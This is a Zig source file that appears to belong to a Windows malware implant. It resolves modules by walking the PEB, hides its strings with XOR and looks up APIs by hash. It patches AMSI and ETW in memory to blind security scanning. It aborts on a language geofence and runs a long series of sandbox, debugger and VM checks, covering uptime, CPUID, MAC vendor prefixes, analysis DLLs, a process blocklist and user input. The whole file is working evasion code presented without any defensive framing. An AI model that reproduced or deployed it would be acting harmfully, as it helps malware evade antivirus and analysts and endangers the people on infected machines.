const std = @import("std");
const direto = @import("direto/direto.zig");
const obf = @import("obf.zig");
const ajuste = @import("ajuste.zig");

pub fn getModuleHandle(module_name_obf: []const u8) usize {
    const name = obf.dexor(std.heap.page_allocator, module_name_obf) catch return 0;
    defer std.heap.page_allocator.free(name);

    const peb = direto.ntdll.getPEB();
    if (peb == 0) return 0;
    const ldr = @as(*usize, @ptrFromInt(peb + 0x18)).*;
    const head = @as(*usize, @ptrFromInt(ldr + 0x20)).*;
    var current = @as(*usize, @ptrFromInt(head)).*;
    while (current != head and current != 0) {
        const entry_base = current - 0x10;
        const name_len = @as(*u16, @ptrFromInt(entry_base + 0x58)).*;
        const name_buf = @as(*usize, @ptrFromInt(entry_base + 0x60)).*;
        if (name_len > 0 and name_buf != 0) {
            const name_slice = @as([*]u16, @ptrFromInt(name_buf))[0 .. name_len / 2];
            if (name_slice.len == name.len) {
                var is_match = true;
                for (name, 0..) |c, i| {
                    var lc = name_slice[i];
                    if (lc >= 'A' and lc <= 'Z') lc += 32;
                    var clc = c;
                    if (clc >= 'A' and clc <= 'Z') clc += 32;
                    if (lc != clc) { is_match = false; break; }
                }
                if (is_match) return @as(*usize, @ptrFromInt(entry_base + 0x30)).*;
            }
        }
        current = @as(*usize, @ptrFromInt(current)).*;
    }
    return 0;
}

pub fn patchMemory(addr: usize, patch: []const u8) bool {
    var base = addr;
    var size: usize = patch.len;
    var old_prot: u32 = 0;
    if (direto.ntProtectVirtualMemory(@bitCast(@as(isize, -1)), &base, &size, 0x40, &old_prot) != 0) return false;
    @memcpy(@as([*]u8, @ptrFromInt(addr))[0..patch.len], patch);
    _ = direto.ntProtectVirtualMemory(@bitCast(@as(isize, -1)), &base, &size, old_prot, &old_prot);
    return true;
}

// Patch AMSI and ETW to neuter in-process scanning/telemetry.
//   AmsiScanBuffer -> mov eax, 0x80070057 (E_INVALIDARG); ret
//   EtwEventWrite  -> xor eax, eax; ret
// Best-effort: modules that are not loaded (e.g. amsi.dll) are skipped.
pub fn patchAmsiEtw() void {
    const amsi = getModuleHandle(&comptime obf.xorStr("amsi.dll"));
    if (amsi != 0) {
        const addr = obf.getProcAddressByHash(amsi, comptime obf.apiHash("AmsiScanBuffer")) catch 0;
        if (addr != 0) _ = patchMemory(addr, &[_]u8{ 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 });
    }

    const ntdll = getModuleHandle(&comptime obf.xorStr("ntdll.dll"));
    if (ntdll != 0) {
        const addr = obf.getProcAddressByHash(ntdll, comptime obf.apiHash("EtwEventWrite")) catch 0;
        if (addr != 0) _ = patchMemory(addr, &[_]u8{ 0x31, 0xC0, 0xC3 });
    }
}

pub fn runAntiAnalysis() bool {
    // 0. AMSI / ETW in-process patch (best-effort)
    patchAmsiEtw();

    // 0b. Geofence — abort if the host language matches any configured langid
    const k32 = getModuleHandle(&comptime obf.xorStr("kernel32.dll"));
    if (k32 == 0) return false;
    const langfn_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("GetUserDefaultLangID")) catch 0;
    if (langfn_addr != 0) {
        const GetUserDefaultLangID = @as(*const fn () callconv(.winapi) u16, @ptrFromInt(langfn_addr));
        const lang = GetUserDefaultLangID();
        for (ajuste.geofence_langids) |lid| {
            if (lang == lid) return false;
        }
    }

    // 1. Uptime check (< 10min = likely sandbox)
    const gt64_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("GetTickCount64")) catch 0;
    if (gt64_addr == 0) return false;
    const gt64 = @as(*const fn () callconv(.winapi) u64, @ptrFromInt(gt64_addr))();
    if (ajuste.anti_vm and gt64 < 1000 * 60 * 10) return false;

    // 2. Core count (< 2 = sandbox)
    const gsi_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("GetSystemInfo")) catch 0;
    if (gsi_addr == 0) return false;
    const SYSTEM_INFO = extern struct { wA: u16, wR: u16, dwP: u32, lpMi: ?*anyopaque, lpMa: ?*anyopaque, dwM: usize, dwN: u32, dwT: u32, dwG: u32, wL: u16, wRev: u16 };
    var si: SYSTEM_INFO = undefined;
    @as(*const fn (*anyopaque) callconv(.winapi) void, @ptrFromInt(gsi_addr))(&si);
    if (ajuste.anti_vm and si.dwN < 2) return false;

    // 3. PEB.BeingDebugged flag
    const peb = direto.ntdll.getPEB();
    if (peb != 0) {
        const being_debugged = @as(*u8, @ptrFromInt(peb + 0x02)).*;
        if (ajuste.anti_debug and being_debugged != 0) return false;
        // PEB.NtGlobalFlag: debugger sets 0x70 (FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS)
        const nt_global_flag = @as(*u32, @ptrFromInt(peb + 0x68)).*;
        if (ajuste.anti_debug and nt_global_flag & 0x70 != 0) return false;
    }

    // 4. CheckRemoteDebuggerPresent
    const crdp_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("CheckRemoteDebuggerPresent")) catch 0;
    if (crdp_addr != 0) {
        const CheckRemoteDebuggerPresent = @as(*const fn (h: ?*anyopaque, p: *i32) callconv(.winapi) i32, @ptrFromInt(crdp_addr));
        var is_debugged: i32 = 0;
        _ = CheckRemoteDebuggerPresent(null, &is_debugged);
        if (ajuste.anti_debug and is_debugged != 0) return false;
    }

    // 5. rdtsc timing check
    // Measure CPU cycles between two rdtsc calls. If delta is too large, a debugger is intercepting.
    var lo: u32 = 0;
    var hi: u32 = 0;
    asm volatile ("rdtsc" : [lo] "={eax}" (lo), [hi] "={edx}" (hi));
    const tsc1: u64 = (@as(u64, hi) << 32) | @as(u64, lo);
    // Small delay
    var i: usize = 0;
    while (i < 10) : (i += 1) {
        asm volatile ("nop");
    }
    asm volatile ("rdtsc" : [lo] "={eax}" (lo), [hi] "={edx}" (hi));
    const tsc2: u64 = (@as(u64, hi) << 32) | @as(u64, lo);
    if (ajuste.anti_debug and tsc2 > tsc1 and tsc2 - tsc1 > 100000) return false;

    // 5b. CPUID hypervisor bit (ECX bit 31 of leaf 1)
    var cpuid_eax: u32 = 0;
    var cpuid_ebx: u32 = 0;
    var cpuid_ecx: u32 = 0;
    var cpuid_edx: u32 = 0;
    asm volatile ("cpuid"
        : [eax] "={eax}" (cpuid_eax), [ebx] "={ebx}" (cpuid_ebx), [ecx] "={ecx}" (cpuid_ecx), [edx] "={edx}" (cpuid_edx)
        : [leaf] "{eax}" (@as(u32, 1))
    );
    if (ajuste.anti_vm and cpuid_ecx & (@as(u32, 1) << 31) != 0) return false;

    // 5c. Sleep skew detection — sandbox patches Sleep to return immediately
    if (ajuste.anti_vm) {
        const sleep_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("Sleep")) catch 0;
        const gtc_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("GetTickCount")) catch 0;
        if (sleep_addr != 0 and gtc_addr != 0) {
            const Sleep = @as(*const fn (u32) callconv(.winapi) void, @ptrFromInt(sleep_addr));
            const GetTickCount = @as(*const fn () callconv(.winapi) u32, @ptrFromInt(gtc_addr));
            const tick_before = GetTickCount();
            Sleep(2000);
            const tick_after = GetTickCount();
            if (tick_after - tick_before < 1500) return false;
        }
    }

    // 5d. MAC prefix check — VM NIC vendor prefixes
    const iphlpapi = getModuleHandle(&comptime obf.xorStr("iphlpapi.dll"));
    if (iphlpapi != 0) {
        const gai_addr = obf.getProcAddressByHash(iphlpapi, comptime obf.apiHash("GetAdaptersInfo")) catch 0;
        if (gai_addr != 0) {
            const IP_ADDR_STRING = extern struct { Next: ?*anyopaque, IpAddress: [16]u8, IpMask: [16]u8, Context: u32 };
            const IP_ADAPTER_INFO = extern struct {
                Next: ?*anyopaque, ComboIndex: u32, AdapterName: [260]u8, Description: [132]u8,
                AddressLength: u32, Address: [8]u8, Index: u32, Type: u32, DhcpEnabled: u32,
                CurrentIpAddress: ?*IP_ADDR_STRING, IpAddressList: IP_ADDR_STRING, GatewayList: IP_ADDR_STRING,
                DhcpServer: IP_ADDR_STRING, HaveWins: u32, PrimaryWinsServer: IP_ADDR_STRING,
                SecondaryWinsServer: IP_ADDR_STRING, LeaseObtained: u32, LeaseExpires: u32,
            };
            const GetAdaptersInfoFn = *const fn (?*IP_ADAPTER_INFO, *u32) callconv(.winapi) u32;
            const GetAdaptersInfo = @as(GetAdaptersInfoFn, @ptrFromInt(gai_addr));
            var size: u32 = 0;
            _ = GetAdaptersInfo(null, &size);
            if (size > 0) {
                const buf = std.heap.page_allocator.alloc(u8, size) catch null;
                if (buf) |b| {
                    defer std.heap.page_allocator.free(b);
                    const adapter = @as(*IP_ADAPTER_INFO, @ptrCast(@alignCast(b.ptr)));
                    if (GetAdaptersInfo(adapter, &size) == 0) {
                        var cur_adapter: ?*IP_ADAPTER_INFO = adapter;
                        while (cur_adapter) |a| {
                            const mac = a.Address[0..3];
                            if (ajuste.anti_vm and ((mac[0] == 0x00 and mac[1] == 0x05 and mac[2] == 0x69) or
                                (mac[0] == 0x00 and mac[1] == 0x0C and mac[2] == 0x29) or
                                (mac[0] == 0x00 and mac[1] == 0x50 and mac[2] == 0x56) or
                                (mac[0] == 0x08 and mac[1] == 0x00 and mac[2] == 0x27) or
                                (mac[0] == 0x00 and mac[1] == 0x15 and mac[2] == 0x5D) or
                                (mac[0] == 0x00 and mac[1] == 0x1C and mac[2] == 0x42) or
                                (mac[0] == 0x00 and mac[1] == 0x16 and mac[2] == 0x3E))) return false;
                            cur_adapter = @as(*IP_ADAPTER_INFO, @ptrCast(@alignCast(a.Next)));
                        }
                    }
                }
            }
        }
    }

    // 5e. Sandbox DLL detection — check loaded modules for analysis DLLs
    const peb2 = direto.ntdll.getPEB();
    if (peb2 != 0) {
        const ldr2 = @as(*usize, @ptrFromInt(peb2 + 0x18)).*;
        const head2 = @as(*usize, @ptrFromInt(ldr2 + 0x20)).*;
        var curr = @as(*usize, @ptrFromInt(head2)).*;
        while (curr != head2 and curr != 0) {
            const entry = curr - 0x10;
            const nl = @as(*u16, @ptrFromInt(entry + 0x58)).*;
            const nb = @as(*usize, @ptrFromInt(entry + 0x60)).*;
            if (nl > 0 and nb != 0) {
                const ns = @as([*]u16, @ptrFromInt(nb))[0 .. nl / 2];
                // Compare against sandbox DLL names (lowercase)
                const sandbox_dlls = [_][]const u8{
                    &comptime obf.xorStr("sbiedll.dll"),
                    &comptime obf.xorStr("dbghelp.dll"),
                    &comptime obf.xorStr("api_log.dll"),
                    &comptime obf.xorStr("dirwatch.dll"),
                    &comptime obf.xorStr("pstorec.dll"),
                    &comptime obf.xorStr("vmcheck.dll"),
                    &comptime obf.xorStr("sandbox.dll"),
                };
                for (sandbox_dlls) |sd_obf| {
                    const sd = obf.dexor(std.heap.page_allocator, sd_obf) catch continue;
                    defer std.heap.page_allocator.free(sd);
                    if (ns.len == sd.len) {
                        var match = true;
                        for (sd, 0..) |c, j| {
                            var lc = ns[j];
                            if (lc >= 'A' and lc <= 'Z') lc += 32;
                            var clc = c;
                            if (clc >= 'A' and clc <= 'Z') clc += 32;
                            if (lc != clc) { match = false; break; }
                        }
                        if (ajuste.anti_vm and match) return false;
                    }
                }
            }
            curr = @as(*usize, @ptrFromInt(curr)).*;
        }
    }

    // 6. VM artifact: check for VM-specific processes via toolhelp snapshot
    const th32_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("CreateToolhelp32Snapshot")) catch 0;
    const p32f_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("Process32FirstW")) catch 0;
    const p32n_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("Process32NextW")) catch 0;
    const ch_addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("CloseHandle")) catch 0;
    if (th32_addr != 0 and p32f_addr != 0 and p32n_addr != 0 and ch_addr != 0) {
        const CreateToolhelp32Snapshot = @as(*const fn (u32, u32) callconv(.winapi) ?*anyopaque, @ptrFromInt(th32_addr));
        const Process32FirstW = @as(*const fn (?*anyopaque, *anyopaque) callconv(.winapi) i32, @ptrFromInt(p32f_addr));
        const Process32NextW = @as(*const fn (?*anyopaque, *anyopaque) callconv(.winapi) i32, @ptrFromInt(p32n_addr));
        const CloseHandle = @as(*const fn (?*anyopaque) callconv(.winapi) i32, @ptrFromInt(ch_addr));

        const PROCESSENTRY32W = extern struct {
            dwSize: u32,
            cntUsage: u32,
            th32ProcessID: u32,
            th32DefaultHeapID: usize,
            th32ModuleID: u32,
            cntThreads: u32,
            th32ParentProcessID: u32,
            pcPriClassBase: i32,
            dwFlags: u32,
            szExeFile: [260]u16,
        };

        const snap = CreateToolhelp32Snapshot(0x00000002, 0); // TH32CS_SNAPPROCESS
        if (snap != null) {
            defer _ = CloseHandle(snap);
            var pe: PROCESSENTRY32W = undefined;
            pe.dwSize = @sizeOf(PROCESSENTRY32W);
            if (Process32FirstW(snap, &pe) != 0) {
                while (true) {
                    // Convert process name to lowercase for comparison
                    var name_buf: [260]u8 = undefined;
                    var name_len: usize = 0;
                    while (name_len < pe.szExeFile.len and pe.szExeFile[name_len] != 0 and name_len < 260) : (name_len += 1) {
                        var c: u8 = @intCast(pe.szExeFile[name_len] & 0xFF);
                        if (c >= 'A' and c <= 'Z') c += 32;
                        name_buf[name_len] = c;
                    }
                    const name = name_buf[0..name_len];
                    // Process blocklist (configured in ajuste.zig) — abort on match
                    for (ajuste.process_blocklist_obf) |bp_obf| {
                        const bp = obf.dexor(std.heap.page_allocator, bp_obf) catch continue;
                        defer std.heap.page_allocator.free(bp);
                        if (std.mem.eql(u8, name, bp)) return false;
                    }

                    if (Process32NextW(snap, &pe) == 0) break;
                }
            }
        }
    }

    // 7. Human interaction check — waits ~2s, verifies mouse movement or keyboard use.
    // Sandboxes often have no input.
    if (ajuste.human_interaction) {
        const user32 = getModuleHandle(&comptime obf.xorStr("user32.dll"));
        if (user32 != 0) {
            const gcp_addr = obf.getProcAddressByHash(user32, comptime obf.apiHash("GetCursorPos")) catch 0;
            const gaks_addr = obf.getProcAddressByHash(user32, comptime obf.apiHash("GetAsyncKeyState")) catch 0;
            const sleep_addr2 = obf.getProcAddressByHash(k32, comptime obf.apiHash("Sleep")) catch 0;
            if (gcp_addr != 0 and gaks_addr != 0 and sleep_addr2 != 0) {
                const POINT = extern struct { x: i32, y: i32 };
                const GetCursorPos = @as(*const fn (*POINT) callconv(.winapi) i32, @ptrFromInt(gcp_addr));
                const GetAsyncKeyState = @as(*const fn (i32) callconv(.winapi) i16, @ptrFromInt(gaks_addr));
                const Sleep2 = @as(*const fn (u32) callconv(.winapi) void, @ptrFromInt(sleep_addr2));
                var p1: POINT = undefined;
                var p2: POINT = undefined;
                _ = GetCursorPos(&p1);
                Sleep2(2000);
                _ = GetCursorPos(&p2);
                if (p1.x == p2.x and p1.y == p2.y) {
                    // No mouse movement — check keyboard
                    var key_pressed = false;
                    var k: i32 = 0x01;
                    while (k <= 0xFE) : (k += 1) {
                        if (GetAsyncKeyState(k) & @as(i16, @bitCast(@as(u16, 0x8000))) != 0) {
                            key_pressed = true;
                            break;
                        }
                    }
                    if (!key_pressed) return false;
                }
            }
        }
    }

    return true;
}

pub fn getEnvVar(allocator: std.mem.Allocator, name: [:0]const u8) ![]u8 {
    const k32 = getModuleHandle(&comptime obf.xorStr("kernel32.dll"));
    if (k32 == 0) return error.Kernel32NotFound;
    const addr = obf.getProcAddressByHash(k32, comptime obf.apiHash("GetEnvironmentVariableA")) catch 0;
    if (addr == 0) return error.ProcNotFound;

    const GetEnvVarA = *const fn ([*:0]const u8, [*]u8, u32) callconv(.winapi) u32;
    const fn_ptr = @as(GetEnvVarA, @ptrFromInt(addr));

    var stack_buf: [260]u8 = undefined;
    const result = fn_ptr(name.ptr, &stack_buf, 260);

    if (result == 0) return error.EnvVarNotFound;
    if (result < 260) {
        return allocator.dupe(u8, stack_buf[0..result]);
    }

    const buf = try allocator.alloc(u8, result + 1);
    defer allocator.free(buf);
    const actual = fn_ptr(name.ptr, buf.ptr, result + 1);
    if (actual == 0) return error.EnvVarNotFound;

    return allocator.dupe(u8, buf[0..actual]);
}
